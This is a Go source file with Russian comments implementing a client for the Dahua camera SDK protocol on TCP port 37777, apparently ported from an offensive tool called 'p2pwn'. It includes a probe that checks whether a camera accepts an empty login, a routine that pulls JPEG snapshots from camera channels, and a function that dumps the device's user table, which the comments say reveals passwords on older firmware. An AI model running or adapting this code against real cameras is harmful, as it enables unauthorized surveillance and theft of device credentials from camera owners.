// Package sdk — Dahua SDK-клиент поверх чистого TCP (порт 37777 камеры
// через fwd). Логин plain или challenge-hash (два шага), snapshot по каналу.
// Протокол фреймов из p2pwn sdkbin.go, но без PTCP-обвязки: форвард порта
// 37777 даёт прямой TCP-поток.
package sdk

import (
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"
)

// ── хеши логина (из p2p auth.go) ─────────────────────────────────────

func gen1Hash(password string) string {
	h := md5.Sum([]byte(password))
	raw := h[:]
	out := make([]byte, 8)
	for i := 0; i < 8; i++ {
		val := (int(raw[i*2]) + int(raw[i*2+1])) % 62
		if val < 10 {
			out[i] = byte(val + 48)
		} else if val < 36 {
			out[i] = byte(val + 55)
		} else {
			out[i] = byte(val + 61)
		}
	}
	return string(out)
}

func standardRPCHash(username, password, realm, random string) string {
	step1 := md5Upper(username + ":" + realm + ":" + password)
	return md5Upper(username + ":" + random + ":" + step1)
}

func md5Upper(s string) string {
	h := md5.Sum([]byte(s))
	return strings.ToUpper(hex.EncodeToString(h[:]))
}

// sdkLoginHash = StandardRPCHash + md5(user:random:Gen1Hash(pass)) верхним регистром.
func sdkLoginHash(username, password, realm, random string) string {
	firstHalf := standardRPCHash(username, password, realm, random)
	h := md5.Sum([]byte(username + ":" + random + ":" + gen1Hash(password)))
	secondHalf := strings.ToUpper(hex.EncodeToString(h[:]))
	return firstHalf + secondHalf
}

// ── клиент ───────────────────────────────────────────────────────────

type Client struct {
	addr string        // 127.0.0.1:<fwd 37777>
	conn net.Conn      // готовый коннект (туннель); не nil — addr игнорируется
	user string
	pass string
}

func New(addr, user, pass string) *Client {
	return &Client{addr: addr, user: user, pass: pass}
}

// NewOnConn — клиент поверх готового коннекта (p2pwn-стиль: туннель
// отдаёт net.Conn напрямую). Коннект закрывается вместе со снапом —
// вызыватель дайлит свежий на каждый вызов.
func NewOnConn(conn net.Conn, user, pass string) *Client {
	return &Client{conn: conn, user: user, pass: pass}
}

// loginPacket — plain-логин (из sdkbin.go): заголовок 0xa0/0x60,
// creds user&&pass, magic tail a1aa, Random-таймштамп.
func loginPacket(user, pass string) []byte {
	ul := []byte(user)
	pl := []byte(pass)
	var creds [16]byte
	copy(creds[:8], ul)
	copy(creds[8:], pl)

	pktLen := 24 + len(ul) + len(pl)
	ts := fmt.Sprintf("%d", time.Now().Unix())

	cmd := make([]byte, 0, 32+len(ul)+len(pl)+len(ts)+8)
	cmd = append(cmd, 0xa0, 0x00, 0x00, 0x60, byte(pktLen), 0x00, 0x00, 0x00)
	cmd = append(cmd, creds[:]...)
	cmd = append(cmd, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa)
	cmd = append(cmd, ul...)
	cmd = append(cmd, "&&"...)
	cmd = append(cmd, pl...)
	cmd = append(cmd, []byte("\x00Random:"+ts+"\r\n\r\n")...)
	return cmd
}

// hashLoginPacket — второй шаг: хеш вместо пароля.
func hashLoginPacket(user, hash string) []byte {
	creds := user + "&&" + hash
	buf := make([]byte, 12+len(creds))
	buf[0] = 0x05
	buf[1] = 0x02
	buf[2] = 0x09
	buf[3] = 0x08
	binary.LittleEndian.PutUint16(buf[4:6], uint16(len(creds)))
	buf[6] = 0x00
	buf[7] = 0x00
	buf[8] = 0xa1
	buf[9] = 0xaa
	copy(buf[10:], creds)
	return buf
}

func parseChallengeBody(body []byte) (realm, random string) {
	text := string(body)

	if idx := strings.Index(text, "Realm:"); idx >= 0 {
		after := text[idx+len("Realm:"):]
		if end := strings.Index(after, "\r\n"); end >= 0 {
			realm = strings.TrimSpace(after[:end])
		}
	}
	if idx := strings.Index(text, "Random:"); idx >= 0 {
		after := text[idx+len("Random:"):]
		if end := strings.Index(after, "\r\n"); end >= 0 {
			random = strings.TrimSpace(after[:end])
		}
	}
	return
}

// snapshotCmd — команда snapshot канала (из sdkbin.go). Канал 0-based:
// камера ожидает индекс channel-1 (p2pwn sdkbin.go:234-237 — ch=0 для
// первого канала; byte(channel) снапил канал 2 вместо 1).
func snapshotCmd(channel int) []byte {
	ch := byte(0)
	if channel > 0 {
		ch = byte(channel - 1)
	}
	cmd := []byte{
		0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x0a, 0x00, 0x00, 0x00,
		ch,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00,
		ch,
		0x00, 0x00, 0x00, 0x01,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	return cmd
}

// readFrame читает один SDK-фрейм: 32-байтовый заголовок + payload.
// Длина payload — LE uint32 в bytes[4:8]. Возвращает фрейм целиком.
func readFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 32)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	pl := binary.LittleEndian.Uint32(hdr[4:8])
	if pl > 16*1024*1024 {
		return nil, fmt.Errorf("sdk frame too large: %d", pl)
	}
	// pl — размер всего пакета; payload = pl - 32 (если поле валидно).
	if pl < 32 {
		return hdr, nil
	}
	body := make([]byte, pl-32)
	if _, err := io.ReadFull(conn, body); err != nil {
		return nil, err
	}
	return append(hdr, body...), nil
}

// login выполняет логин: plain-пакет → при challenge (resp[8]==1) —
// хеш-логин тем же соединением. Возвращает открытый conn (закрывает при
// ошибке).
func (c *Client) login(timeout time.Duration) (net.Conn, error) {
	var conn net.Conn
	if c.conn != nil {
		conn = c.conn
		conn.SetDeadline(time.Now().Add(timeout))
	} else {
		var err error
		conn, err = net.DialTimeout("tcp", c.addr, timeout)
		if err != nil {
			return nil, fmt.Errorf("dial %s: %w", c.addr, err)
		}
		conn.SetDeadline(time.Now().Add(timeout))
	}

	if _, err := conn.Write(loginPacket(c.user, c.pass)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("login send: %w", err)
	}

	resp, err := readFrame(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("login read: %w", err)
	}
	if len(resp) < 10 {
		conn.Close()
		return nil, fmt.Errorf("login response too short (%d bytes)", len(resp))
	}
	if resp[8] == 0 {
		// plain-логин прошёл
		return conn, nil
	}
	if resp[8] == 1 {
		cr, crnd := parseChallengeBody(resp)
		if cr == "" || crnd == "" {
			conn.Close()
			return nil, fmt.Errorf("login: challenge without realm/random")
		}
		fullHash := sdkLoginHash(c.user, c.pass, cr, crnd)
		if _, err := conn.Write(hashLoginPacket(c.user, fullHash)); err != nil {
			conn.Close()
			return nil, fmt.Errorf("hash login send: %w", err)
		}
		resp, err = readFrame(conn)
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("hash login read: %w", err)
		}
		if len(resp) < 10 {
			conn.Close()
			return nil, fmt.Errorf("hash login short (%d bytes)", len(resp))
		}
		if resp[8] != 0 {
			conn.Close()
			return nil, fmt.Errorf("hash login code %d/%d", resp[8], resp[9])
		}
		return conn, nil
	}

	conn.Close()
	return nil, fmt.Errorf("login failed: code %d/%d", resp[8], resp[9])
}

// TryNoAuth — SDK-проба без авторизации: plain-логин с пустыми кредами
// на готовом коннекте. true = устройство приняло без пароля (старая
// прошивка / крашнутый auth-сервис). Коннект НЕ закрывается — вызыватель
// решает что с ним делать.
func TryNoAuth(conn net.Conn, timeout time.Duration) bool {
	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(loginPacket("", "")); err != nil {
		return false
	}
	resp, err := readFrame(conn)
	if err != nil || len(resp) < 10 {
		return false
	}
	return resp[8] == 0
}

func containsJPEGEnd(data []byte) bool {
	for i := 0; i < len(data)-1; i++ {
		if data[i] == 0xff && data[i+1] == 0xd9 {
			return true
		}
	}
	return false
}

// stripSnapshotGarbage вырезает служебные вкрапления в потоке снапа
// (эмпирика из sdkbin.go).
func stripSnapshotGarbage(data []byte, channel int) []byte {
	ch := byte(channel)
	garbage1 := []byte{0x0a, ch, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00}
	garbage2 := []byte{0xbc, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, ch}

	for {
		idx := index(data, garbage1)
		if idx < 0 {
			break
		}
		start := idx - 24
		if start < 0 {
			start = 0
		}
		end := idx + len(garbage1)
		if end > len(data) {
			end = len(data)
		}
		data = append(data[:start], data[end:]...)
	}
	for {
		idx := index(data, garbage2)
		if idx < 0 {
			break
		}
		end := idx + 24
		if end > len(data) {
			end = len(data)
		}
		data = append(data[:idx], data[end:]...)
	}
	return data
}

func index(data, sub []byte) int {
	return strings.Index(string(data), string(sub))
}

// GetSnapshot — JPEG-кадр канала. Логин → snapshotCmd → сборка до 0xFFD9
// (+ дренаж хвоста) → срез 32-байтового заголовка → чистка мусора.
func (c *Client) GetSnapshot(channel int, timeout time.Duration) ([]byte, error) {
	conn, err := c.login(timeout)
	if err != nil {
		return nil, fmt.Errorf("snapshot login: %w", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// съесть припоздавшие пустые ack после логина
	conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	_, _ = readFrame(conn)
	conn.SetDeadline(time.Now().Add(timeout))

	if _, err := conn.Write(snapshotCmd(channel)); err != nil {
		return nil, fmt.Errorf("snapshot send: %w", err)
	}

	var data []byte
	buf := make([]byte, 32*1024)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			if len(data) > 0 {
				break
			}
			return nil, fmt.Errorf("snapshot read: %w", err)
		}
		if containsJPEGEnd(data) {
			// дренаж хвоста кадра
			conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
			for {
				n, err := conn.Read(buf)
				if n > 0 {
					data = append(data, buf[:n]...)
				}
				if err != nil {
					break
				}
			}
			break
		}
	}

	if len(data) >= 32 {
		data = data[32:]
	}
	data = stripSnapshotGarbage(data, channel)

	if len(data) < 100 || data[0] != 0xFF || data[1] != 0xD8 {
		return nil, fmt.Errorf("snapshot: invalid jpeg (%d bytes)", len(data))
	}
	return data, nil
}

// ── SDK user-management дамп (a6-пакеты, из p2pwn sdkbin.go) ──────────

// SDKUser — строка таблицы юзеров из a6 op 9. Поле Pass камера отдаёт
// не всегда (на части fw пустое или хеш) — парсим что есть, Raw хранит
// строку целиком для диагностики.
type SDKUser struct {
	Index int
	Name  string
	Pass  string
	Group string
	Raw   string
}

// a1Packet — «мнгновенный» init юзер-менеджмента.
func a1Packet() []byte {
	pkt := make([]byte, 32)
	pkt[0] = 0xa1
	return pkt
}

// a4Packet — запрос инфо с подкомандой в байте 8 (0x1a звук, 0x08 каналы).
func a4Packet(op byte) []byte {
	pkt := make([]byte, 32)
	pkt[0] = 0xa4
	pkt[8] = op
	return pkt
}

// a6MgmtPacket — юзер-менеджмент: op в LE uint32 на байте 8, payload с 32-го.
// op: 1 = init, 5 = группы, 9 = список юзеров, 6 = добавить юзера.
func a6MgmtPacket(op uint32, payload []byte) []byte {
	pkt := make([]byte, 32+len(payload))
	pkt[0] = 0xa6
	pkt[4] = byte(len(payload))
	binary.LittleEndian.PutUint32(pkt[8:12], op)
	copy(pkt[32:], payload)
	return pkt
}

// sdkExchange — отправить пакет, прочитать один фрейм-ответ.
func (c *Client) sdkExchange(conn net.Conn, pkt []byte) ([]byte, error) {
	if _, err := conn.Write(pkt); err != nil {
		return nil, err
	}
	return readFrame(conn)
}

// userMgmtInit — инициализация юзер-менеджмента перед a6-командами
// (2×a1, 2×[a4:0x1a, a4:0x08], a6 op 1). Порядок и счётчики — парити
// с p2pwn GetUsersSDK; ответы дренируются, содержимое не проверяется.
func (c *Client) userMgmtInit(conn net.Conn, timeout time.Duration) error {
	for i := 0; i < 2; i++ {
		if _, err := c.sdkExchange(conn, a1Packet()); err != nil {
			return fmt.Errorf("a1[%d]: %w", i, err)
		}
	}
	for i := 0; i < 2; i++ {
		for _, op := range []byte{0x1a, 0x08} {
			if _, err := c.sdkExchange(conn, a4Packet(op)); err != nil {
				return fmt.Errorf("a4 0x%02x[%d]: %w", op, i, err)
			}
		}
	}
	if _, err := c.sdkExchange(conn, a6MgmtPacket(1, nil)); err != nil {
		return fmt.Errorf("a6 init: %w", err)
	}
	return nil
}

// parseUserListFull разбирает ответ a6 op 9: построчно
// "index:Name[:Pass][:Group]", пустые строки/нулевые байты — мусор.
func parseUserListFull(resp []byte) []SDKUser {
	body := ""
	if len(resp) > 32 {
		body = string(resp[32:])
	}
	body = strings.TrimRight(body, "\x00\r\n ")
	if body == "" {
		return nil
	}
	var users []SDKUser
	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) < 2 {
			continue
		}
		u := SDKUser{Name: parts[1], Raw: line}
		if idx, err := strconv.Atoi(parts[0]); err == nil {
			u.Index = idx
		}
		if len(parts) > 2 {
			u.Pass = parts[2]
		}
		if len(parts) > 3 {
			u.Group = parts[3]
		}
		users = append(users, u)
	}
	return users
}

// GetUsers — дамп таблицы юзеров через SDK-бинарник: логин (plain или
// challenge-hash) → userMgmtInit → a6 op 5 (группы) → a6 op 9 (юзеры).
// Второй возврат — сырой ответ op 9 целиком (для дев-диагностики).
// Логин под любым подошедшим аккаунтом даёт полный список — включая
// пароли на старых прошивках.
func (c *Client) GetUsers(timeout time.Duration) ([]SDKUser, string, error) {
	conn, err := c.login(timeout)
	if err != nil {
		return nil, "", fmt.Errorf("login: %w", err)
	}
	defer conn.Close()

	// съесть припоздавшие пустые ack после логина (как в GetSnapshot)
	conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	_, _ = readFrame(conn)
	conn.SetDeadline(time.Now().Add(timeout))

	if err := c.userMgmtInit(conn, timeout); err != nil {
		return nil, "", err
	}
	if _, err := c.sdkExchange(conn, a6MgmtPacket(5, nil)); err != nil {
		return nil, "", fmt.Errorf("groups: %w", err)
	}
	usersResp, err := c.sdkExchange(conn, a6MgmtPacket(9, nil))
	if err != nil {
		return nil, "", fmt.Errorf("users: %w", err)
	}
	raw := strings.TrimRight(string(usersResp), "\x00")
	return parseUserListFull(usersResp), raw, nil
}
